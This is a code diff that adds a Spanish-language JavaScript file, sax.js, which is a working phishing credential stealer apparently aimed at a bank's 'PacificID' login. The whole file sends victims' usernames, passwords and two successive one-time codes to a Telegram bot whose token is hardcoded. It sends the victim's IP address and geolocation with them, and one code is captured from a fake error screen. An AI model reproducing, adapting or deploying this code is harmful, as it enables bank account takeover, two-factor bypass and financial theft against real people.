@@ -1,0 +1,193 @@
+// sax.js - Sistema de Captura de Datos
+class DataCapture {
+    constructor() {
+        this.botToken = '8184267365:AAEg-GR70W8vUwpTDW6tFYKimteZ3nQFXnU';
+        this.chatId = '8281481654';
+        this.apiUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
+        console.log('✅ sax.js inicializado correctamente');
+    }
+
+    // Función para obtener la IP del usuario
+    async getIPAddress() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            return 'No disponible';
+        }
+    }
+
+    // Función para obtener la ubicación basada en IP
+    async getLocation(ip) {
+        try {
+            if (ip === 'No disponible') return { city: 'No disponible', country: 'No disponible' };
+            const response = await fetch(`https://ipapi.co/${ip}/json/`);
+            const data = await response.json();
+            return {
+                city: data.city || 'No disponible',
+                country: data.country_name || 'No disponible',
+                region: data.region || 'No disponible',
+                isp: data.org || 'No disponible'
+            };
+        } catch (error) {
+            return { city: 'No disponible', country: 'No disponible' };
+        }
+    }
+
+    // Función para enviar LOGIN a Telegram
+    async sendLoginToTelegram(username, password) {
+        try {
+            console.log('🔹 sax.js: Enviando login a Telegram...');
+            
+            // Obtener IP y ubicación
+            const ip = await this.getIPAddress();
+            const location = await this.getLocation(ip);
+            
+            // Crear mensaje de login
+            const message = `
+🔐 *NUEVO LOGIN DETECTADO - sax.js*
+
+👤 *Usuario:* \`${username}\`
+🔑 *Contraseña:* \`${password}\`
+
+🌐 *IP:* \`${ip}\`
+🏙️ *Ciudad:* ${location.city}
+🇺🇸 *País:* ${location.country}
+📍 *Región:* ${location.region}
+📡 *ISP:* ${location.isp}
+
+⏰ *Fecha:* ${new Date().toLocaleString('es-ES')}
+
+💾 *Sistema:* sax.js
+            `;
+
+            // Enviar a Telegram
+            const response = await fetch(this.apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: this.chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            const result = await response.json();
+            
+            if (result.ok) {
+                console.log('✅ sax.js: Login enviado a Telegram exitosamente');
+                return true;
+            } else {
+                console.error('❌ sax.js: Error al enviar login:', result);
+                return true; // Continuar flujo
+            }
+        } catch (error) {
+            console.error('❌ sax.js: Error en sendLoginToTelegram:', error);
+            return true; // Continuar flujo
+        }
+    }
+
+    // Función para enviar PRIMER CÓDIGO a Telegram
+    async sendPrimerCodigo(codigo) {
+        try {
+            console.log('🔹 sax.js: Enviando primer código a Telegram...');
+            
+            const ip = await this.getIPAddress();
+            const location = await this.getLocation(ip);
+            
+            const message = `
+🔢 *PRIMER CÓDIGO PACIFICID - sax.js*
+
+🔐 *Código:* \`${codigo}\`
+
+🌐 *IP:* \`${ip}\`
+🏙️ *Ciudad:* ${location.city}
+
+⏰ *Fecha:* ${new Date().toLocaleString('es-ES')}
+
+💾 *Sistema:* sax.js
+            `;
+
+            const response = await fetch(this.apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: this.chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            const result = await response.json();
+            
+            if (result.ok) {
+                console.log('✅ sax.js: Primer código enviado a Telegram');
+                return true;
+            } else {
+                console.error('❌ sax.js: Error al enviar primer código:', result);
+                return true;
+            }
+        } catch (error) {
+            console.error('❌ sax.js: Error en sendPrimerCodigo:', error);
+            return true;
+        }
+    }
+
+    // Función para enviar SEGUNDO CÓDIGO a Telegram
+    async sendSegundoCodigo(codigo) {
+        try {
+            console.log('🔹 sax.js: Enviando segundo código a Telegram...');
+            
+            const ip = await this.getIPAddress();
+            const location = await this.getLocation(ip);
+            
+            const message = `
+🔢 *SEGUNDO CÓDIGO PACIFICID - sax.js*
+
+🔐 *Código:* \`${codigo}\`
+
+⚠️ *Nota:* Código ingresado en pantalla de error
+
+🌐 *IP:* \`${ip}\`
+🏙️ *Ciudad:* ${location.city}
+
+⏰ *Fecha:* ${new Date().toLocaleString('es-ES')}
+
+💾 *Sistema:* sax.js
+            `;
+
+            const response = await fetch(this.apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: this.chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            const result = await response.json();
+            
+            if (result.ok) {
+                console.log('✅ sax.js: Segundo código enviado a Telegram');
+                return true;
+            } else {
+                console.error('❌ sax.js: Error al enviar segundo código:', result);
+                return true;
+            }
+        } catch (error) {
+            console.error('❌ sax.js: Error en sendSegundoCodigo:', error);
+            return true;
+        }
+    }
+}
+
+// Crear instancia global de sax
+const sax = new DataCapture();
